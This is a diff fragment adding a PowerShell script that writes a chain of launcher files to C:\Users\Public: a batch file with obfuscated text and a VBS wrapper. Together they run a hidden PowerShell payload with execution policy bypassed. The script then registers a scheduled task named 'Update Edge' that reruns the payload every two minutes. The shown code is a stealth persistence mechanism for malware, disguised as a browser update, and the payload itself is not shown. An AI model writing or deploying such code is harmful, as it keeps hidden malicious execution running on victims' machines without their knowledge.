@@ -1,0 +1,68 @@
+'@
+[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)
+
+
+$Content = @'
+@e%Conted%%Conted% off
+set "ps=powershell.exe"
+set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
+set "cmd=C:\Users\Public\Conted.ps1"
+%ps% %Contedms% -Command "& '%cmd%'"
+exit /b
+
+'@
+[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)
+
+$Content = @'
+on error resume next
+Function CreateWshShellObj()
+    Dim objName
+    objName = "WScript.Shell"
+    Set CreateWshShellObj = CreateObject(objName)
+End Function
+
+Function GetFilePath()
+    Dim filePath
+    filePath = "C:\Users\Public\Conted.bat"
+    GetFilePath = filePath
+End Function
+
+Function GetVisibilitySetting()
+    Dim visibility
+    visibility = 0
+    GetVisibilitySetting = visibility
+End Function
+
+Function RunFile(wshShellObj, filePath, visibility)
+    wshShellObj.Run filePath, visibility
+End Function
+
+Set wshShellObj = CreateWshShellObj()
+filePath = GetFilePath()
+visibility = GetVisibilitySetting()
+Call RunFile(wshShellObj, filePath, visibility)
+
+'@
+[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)
+
+
+Sleep 2
+
+$scheduler = New-Object -ComObject Schedule.Service
+$scheduler.Connect()
+
+$taskDefinition = $scheduler.NewTask(0)
+$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
+$taskDefinition.Settings.Enabled = $true
+$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
+
+$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
+$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
+$trigger.Repetition.Interval = "PT2M"
+
+# .......... ...... Action
+$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction
+$action.Path = "C:\Users\Public\Conted.vbs"
+
+$taskFolder = $scheduler.GetFolder("\")
+$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
